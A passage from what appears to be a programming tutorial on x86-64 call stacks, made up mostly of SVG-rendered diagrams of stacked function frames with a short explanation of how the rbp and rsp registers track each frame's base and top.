<text text-anchor='middle' x='272' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='132' fill='currentColor' style='font-size:1em'>F</text>
<text text-anchor='middle' x='280' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='132' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='288' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='244' fill='currentColor' style='font-size:1em'>F</text>
<text text-anchor='middle' x='288' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='356' fill='currentColor' style='font-size:1em'>F</text>
<text text-anchor='middle' x='288' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='132' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='296' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='244' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='296' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='356' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='296' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='132' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='304' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='244' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='304' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='356' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='304' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='244' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='312' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='356' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='312' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='132' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='320' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='244' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='328' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='356' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='328' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='84' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='368' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='196' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='368' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='308' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='368' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='420' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='368' y='436' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='452' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='468' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='484' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='456' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='456' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='456' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='456' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='456' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='456' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='456' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='456' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='456' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='456' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='456' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='456' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='456' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='456' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='456' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='456' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='456' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='456' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='456' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='456' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='456' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='456' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='456' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='456' y='436' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='456' y='452' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='456' y='468' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='456' y='484' fill='currentColor' style='font-size:1em'>▼</text>
<text text-anchor='middle' x='496' y='212' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='496' y='244' fill='currentColor' style='font-size:1em'>G</text>
<text text-anchor='middle' x='496' y='276' fill='currentColor' style='font-size:1em'>T</text>
<text text-anchor='middle' x='496' y='308' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='504' y='212' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='504' y='244' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='504' y='276' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='504' y='308' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='512' y='212' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='512' y='244' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='512' y='276' fill='currentColor' style='font-size:1em'>w</text>
<text text-anchor='middle' x='512' y='308' fill='currentColor' style='font-size:1em'>w</text>
<text text-anchor='middle' x='520' y='212' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='520' y='244' fill='currentColor' style='font-size:1em'>w</text>
<text text-anchor='middle' x='520' y='276' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='528' y='212' fill='currentColor' style='font-size:1em'>k</text>
<text text-anchor='middle' x='528' y='244' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='528' y='276' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='528' y='308' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='536' y='276' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='536' y='308' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='544' y='276' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='544' y='308' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='552' y='308' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='560' y='308' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='568' y='308' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='576' y='308' fill='currentColor' style='font-size:1em'>s</text>
</g>

    </svg>
  
</div>
<p>Whenever a function is called it creates its stack frame, and all the local variables for that function will be stored in that function&rsquo;s stack frame. This introduces the need to track 2 values for the current stack frame.</p>
<ol>
<li>What is the base of the stack frame? Where did the stack frame start?</li>
<li>What is the top most location of the stack frame? How much the stack has grown?</li>
</ol>
<p>These are tracked by 2 special purpose registers - <code>rbp</code> (64-bit base pointer register) and <code>rsp</code> (64-bit stack pointer register) respectively.</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 472 553"
      >
      <g transform='translate(8,16)'>
<text text-anchor='middle' x='24' y='20' fill='currentColor' style='font-size:1em'>H</text>
<text text-anchor='middle' x='24' y='532' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='32' y='20' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='32' y='532' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='40' y='20' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='40' y='532' fill='currentColor' style='font-size:1em'>w</text>
<text text-anchor='middle' x='48' y='20' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='56' y='532' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='64' y='20' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='64' y='532' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='72' y='20' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='72' y='532' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='80' y='20' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='80' y='532' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='88' y='20' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='88' y='532' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='96' y='20' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='96' y='532' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='104' y='20' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='104' y='532' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='112' y='20' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='120' y='244' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='128' y='132' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='128' y='244' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='128' y='356' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='128' y='468' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='136' y='132' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='136' y='244' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='136' y='356' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='136' y='468' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='144' y='132' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='144' y='244' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='144' y='356' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='144' y='468' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='152' y='132' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='152' y='244' fill='currentColor' style='font-size:1em'>k</text>
<text text-anchor='middle' x='152' y='356' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='152' y='468' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='160' y='132' fill='currentColor' style='font-size:1em'>k</text>
<text text-anchor='middle' x='160' y='356' fill='currentColor' style='font-size:1em'>k</text>
<text text-anchor='middle' x='160' y='468' fill='currentColor' style='font-size:1em'>k</text>
<text text-anchor='middle' x='168' y='244' fill='currentColor' style='font-size:1em'>F</text>
<text text-anchor='middle' x='176' y='132' fill='currentColor' style='font-size:1em'>F</text>
<text text-anchor='middle' x='176' y='244' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='176' y='356' fill='currentColor' style='font-size:1em'>F</text>
<text text-anchor='middle' x='176' y='468' fill='currentColor' style='font-size:1em'>F</text>
<text text-anchor='middle' x='184' y='132' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='184' y='196' fill='currentColor' style='font-size:1em'>▲</text>
<text text-anchor='middle' x='184' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='184' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='184' y='244' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='184' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='184' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='184' y='292' fill='currentColor' style='font-size:1em'>▼</text>
<text text-anchor='middle' x='184' y='356' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='184' y='468' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='192' y='132' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='192' y='244' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='192' y='356' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='192' y='420' fill='currentColor' style='font-size:1em'>▲</text>
<text text-anchor='middle' x='192' y='436' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='192' y='452' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='192' y='468' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='192' y='484' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='192' y='500' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='192' y='516' fill='currentColor' style='font-size:1em'>▼</text>
<text text-anchor='middle' x='200' y='132' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='200' y='244' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='200' y='356' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='200' y='468' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='208' y='84' fill='currentColor' style='font-size:1em'>▲</text>
<text text-anchor='middle' x='208' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='208' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='208' y='132' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='208' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='208' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='208' y='180' fill='currentColor' style='font-size:1em'>▼</text>
<text text-anchor='middle' x='208' y='308' fill='currentColor' style='font-size:1em'>▲</text>
<text text-anchor='middle' x='208' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='208' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='208' y='356' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='208' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='208' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='208' y='404' fill='currentColor' style='font-size:1em'>▼</text>
<text text-anchor='middle' x='208' y='468' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='216' y='244' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='224' y='132' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='224' y='356' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='224' y='468' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='240' y='68' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='240' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='180' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='240' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='292' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='240' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='404' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='240' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='436' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='452' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='468' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='248' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='116' fill='currentColor' style='font-size:1em'>F</text>
<text text-anchor='middle' x='264' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='116' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='272' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='228' fill='currentColor' style='font-size:1em'>F</text>
<text text-anchor='middle' x='272' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='340' fill='currentColor' style='font-size:1em'>F</text>
<text text-anchor='middle' x='272' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='452' fill='currentColor' style='font-size:1em'>F</text>
<text text-anchor='middle' x='280' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='116' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='280' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='228' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='280' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='340' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='280' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='452' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='288' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='116' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='288' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='228' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='288' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='340' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='288' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='452' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='296' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='228' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='296' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='340' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='296' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='452' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='304' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='116' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='304' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='228' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='312' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='340' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='312' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='452' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='320' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='68' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='352' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='352' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='352' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='352' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='352' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='352' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='352' y='180' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='352' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='352' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='352' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='352' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='352' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='352' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='352' y='292' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='352' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='352' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='352' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='352' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='352' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='352' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='352' y='404' fill='currentColor' style='font-size:1em'>┤</text>
